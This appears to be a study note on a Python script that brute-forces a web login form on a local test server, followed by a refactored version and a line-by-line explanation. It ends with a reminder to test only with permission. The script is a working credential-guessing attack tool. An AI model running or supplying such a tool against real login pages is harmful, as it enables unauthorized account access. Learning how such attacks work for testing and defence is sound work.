```python
import requests
import sys

target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords = "top-100.txt"
needle = "Welcome back"

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n")
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            if needle.encode() in r.content:  # Corrected `endcode` to `encode`
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password, username))
                sys.exit(0)  # Added `0` to signify a successful exit
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo valid password found for '{}'!\n".format(username))

```

Output
![[Pasted image 20240813225902.png]]


### Step-by-Step Explanation

#### 1. **Importing Modules**

```python
import requests
import sys
```
- **`requests`**: A popular library for making HTTP requests.
- **`sys`**: Provides access to system-specific parameters and functions, such as standard input/output.

#### 2. **Defining Variables**

```python
target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
password_file = "top-100.txt"
needle = "Welcome back"
```
- **`target`**: The URL of the login endpoint where POST requests will be sent.
- **`usernames`**: A list of usernames to test.
- **`password_file`**: The file containing a list of passwords to test, one per line.
- **`needle`**: The specific text to look for in the response to determine if the login was successful.

#### 3. **Defining the `try_login` Function**

```python
def try_login(username, password):
    try:
        response = requests.post(target, data={"username": username, "password": password})
        response.raise_for_status()  # Ensure we raise an error for bad HTTP responses
        return needle.encode() in response.content
    except requests.RequestException as e:
        sys.stderr.write(f"Error during request: {e}\n")
        return False
```
- **Function Purpose**: Attempts to log in with the given username and password, and checks if the response contains the `needle` text.
- **`requests.post`**: Sends a POST request to the `target` with the username and password as form data.
- **`response.raise_for_status()`**: Raises an HTTPError for bad responses (status codes 4xx or 5xx).
- **`needle.encode() in response.content`**: Checks if the response content contains the `needle` text, indicating a successful login.
- **Exception Handling**: Catches and reports any exceptions that occur during the request.

#### 4. **Defining the `main` Function**

```python
def main():
    for username in usernames:
        with open(password_file, "r") as passwords_list:
            for password in passwords_list:
                password = password.strip()
                sys.stdout.write(f"[X] Attempting user:password -> {username}:{password}\r")
                sys.stdout.flush()
                if try_login(username, password):
                    sys.stdout.write("\n")
                    sys.stdout.write(f"\t[>>>>>] Valid password '{password}' found for user '{username}'!\n")
                    sys.exit(0)  # Exit with status code 0 for success
            sys.stdout.write("\n")
            sys.stdout.write(f"\tNo valid password found for '{username}'!\n")
    sys.exit(1)  # Exit with status code 1 if no valid password is found
```
- **Function Purpose**: Iterates through each username and password, attempts to log in, and reports results.
- **`for username in usernames:`**: Iterates over each username in the list.
- **`with open(password_file, "r") as passwords_list:`**: Opens the password file for reading.
- **`password.strip()`**: Removes any leading or trailing whitespace from the password.
- **`sys.stdout.write` and `sys.stdout.flush()`**: Outputs status messages to the console and ensures they are immediately displayed.
- **`if try_login(username, password):`**: Checks if the current username-password combination is valid by calling `try_login`.
- **`sys.exit(0)`**: Exits the script with a status code of `0` to indicate success if a valid password is found.
- **`sys.exit(1)`**: Exits the script with a status code of `1` if no valid password is found after testing all combinations.

#### 5. **Running the `main` Function**

```python
if __name__ == "__main__":
    main()
```
- **Purpose**: Ensures that the `main` function is executed only if the script is run directly (not imported as a module).

### Summary

1. **Initialize**: Define variables and set up the login endpoint, usernames, password file, and success indicator.
2. **Define Functions**:
    - `try_login()`: Handles login attempts and checks for success.
    - `main()`: Orchestrates the brute-force process by iterating over usernames and passwords.
3. **Execute**: Run the `main` function if the script is executed directly.

This script is a basic example of how to perform a brute-force login attack and should be used ethically and legally. Always ensure you have permission before testing the security of any system.